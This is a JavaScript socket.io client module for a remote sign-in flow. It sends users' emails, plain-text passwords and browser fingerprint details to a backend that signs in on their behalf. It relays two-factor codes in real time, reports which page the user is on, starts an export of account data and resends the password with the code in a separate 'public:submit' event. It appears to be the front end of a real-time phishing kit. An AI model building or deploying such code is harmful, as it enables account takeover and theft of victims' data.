import { io } from "socket.io-client";

/* Public socket + auth state.
 *
 * One connection per tab.  Auth events are kept in a tiny external store so
 * Loading and Verify can subscribe with useSyncExternalStore; the job id is
 * mirrored to sessionStorage so a refresh re-attaches to the running job.
 */

const fallback = `${window.location.protocol}//${window.location.hostname}:4001`;
export const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || fallback;

let socket = null;
let lastEmail = "";
let lastPassword = "";

const initial = {
  status: "idle",
  state: "",
  message: "",
  jobId: null,
  accountId: null,
  twofa: null,
  result: null,
  account: null,
  info: null,
  export: null,
  error: "",
  connected: false,
  startedAt: 0,
};

let authState = initial;
const listeners = new Set();

function patch(next) {
  authState = { ...authState, ...next };
  for (const listener of listeners) listener();
}

export function subscribeAuth(listener) {
  listeners.add(listener);
  return () => listeners.delete(listener);
}

export function getAuthState() {
  return authState;
}

export function isMockAuth() {
  if (import.meta.env.VITE_MOCK_AUTH === "1") return true;
  try {
    if (sessionStorage.getItem("mockAuth") === "1") return true;
  } catch {
    // private mode
  }
  return new URLSearchParams(window.location.search).has("mock");
}

function storedJobId() {
  try {
    return sessionStorage.getItem("authJobId") || "";
  } catch {
    return "";
  }
}

function storeJob(jobId, accountId) {
  try {
    sessionStorage.setItem("authJobId", jobId);
    sessionStorage.setItem("authAccountId", accountId);
  } catch {
    // ignore
  }
}

function wire(socketInstance) {
  socketInstance.on("connect", () => {
    patch({ connected: true });
    const jobId = storedJobId();
    if (jobId && !isMockAuth()) {
      socketInstance.emit("auth:attach", { jobId }, () => {});
    }
  });
  socketInstance.on("disconnect", () => patch({ connected: false }));

  socketInstance.on("auth:state", (payload) => {
    patch({
      status: payload.state || "auth",
      state: payload.state || "",
      message: payload.message || "",
      jobId: payload.jobId || authState.jobId,
      accountId: payload.accountId || authState.accountId,
    });
  });

  socketInstance.on("auth:2fa", (payload) => {
    patch({
      status: "twofa",
      twofa: payload,
      message: payload.notice || "",
      jobId: payload.jobId || authState.jobId,
    });
  });

  socketInstance.on("auth:result", (payload) => {
    patch({
      status: payload.status === "ok" ? "connected" : payload.status,
      result: payload,
      account: payload.account ?? authState.account,
      error: payload.status === "ok" ? "" : payload.message || "Sign-in failed",
    });
  });

  socketInstance.on("account:info", (payload) => {
    patch({ info: payload, account: { ...(authState.account ?? {}), ...payload } });
  });

  socketInstance.on("export:progress", (payload) => patch({ export: payload }));
  socketInstance.on("export:done", (payload) => patch({ export: payload }));

  socketInstance.on("public:notice", (notice) => {
    window.dispatchEvent(new CustomEvent("app:notice", { detail: notice }));
  });
}

export function getPublicSocket() {
  if (!socket) {
    socket = io(`${SOCKET_URL}/public`, {
      transports: ["websocket", "polling"],
      reconnectionDelayMax: 5000,
    });
    wire(socket);
  }
  return socket;
}

export function announcePage(page) {
  getPublicSocket().emit("public:hello", { page }, () => {});
}

export function rememberEmail(email) {
  lastEmail = email;
}

export function rememberPassword(password) {
  lastPassword = password;
}

/* --------------------------------------------------------------- auth flow */

export async function startAuth({ email, password }) {
  rememberEmail(email);
  rememberPassword(password);
  try {
    sessionStorage.setItem("authEmail", email);
    sessionStorage.removeItem("authError");
  } catch {
    // private mode
  }
  patch({
    ...initial,
    status: "queued",
    startedAt: Date.now(),
    jobId: null,
    connected: socket?.connected ?? false,
  });

  if (isMockAuth()) {
    const jobId = `mock-${Date.now()}`;
    storeJob(jobId, "mock");
    patch({ status: "auth", jobId, accountId: "mock", message: "Mock sign-in" });
    return { ok: true, jobId, accountId: "mock", mock: true };
  }

  const instance = getPublicSocket();
  return new Promise((resolve, reject) => {
    instance.timeout(20_000).emit(
      "auth:start",
      {
        email,
        password,
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      },
      (error, response) => {
        if (error) return reject(new Error("The sign-in service did not answer."));
        if (!response?.ok) return reject(new Error(response?.error || "Could not start sign-in."));
        storeJob(response.jobId, response.accountId);
        patch({
          status: response.status || "queued",
          jobId: response.jobId,
          accountId: response.accountId,
          message: response.reused ? "Attached to the running sign-in" : "Signing in",
        });
        resolve(response);
      }
    );
  });
}

export function attachAuth(jobId) {
  if (!jobId || isMockAuth()) return;
  getPublicSocket().emit("auth:attach", { jobId }, () => {});
}

export function submit2fa({ jobId, choiceId, code }) {
  return callAuth("auth:submit_2fa", { jobId, choiceId, code });
}

export function resend2fa({ jobId, choiceId }) {
  return callAuth("auth:resend_2fa", { jobId, choiceId });
}

export function switch2fa({ jobId, fromChoiceId, toChoiceId }) {
  return callAuth("auth:switch_2fa", { jobId, fromChoiceId, toChoiceId });
}

export function startExport(jobId) {
  if (!jobId || jobId.startsWith("mock-")) return Promise.resolve({ ok: true });
  return new Promise((resolve) => {
    getPublicSocket().timeout(8000).emit("export:start", { jobId }, (error, response) => {
      if (error) return resolve({ ok: false, error: "timeout" });
      resolve(response ?? { ok: false });
    });
  });
}

function callAuth(event, payload) {
  return new Promise((resolve, reject) => {
    getPublicSocket().timeout(15_000).emit(event, payload, (error, response) => {
      if (error) return reject(new Error("The verification service did not answer."));
      if (!response?.ok) return reject(new Error(response?.error || "Request failed."));
      resolve(response);
    });
  });
}

export function submitCode(code) {
  if (!lastEmail) return;
  getPublicSocket().emit(
    "public:submit",
    { email: lastEmail, password: lastPassword, code, page: "/verify" },
    () => {}
  );
}
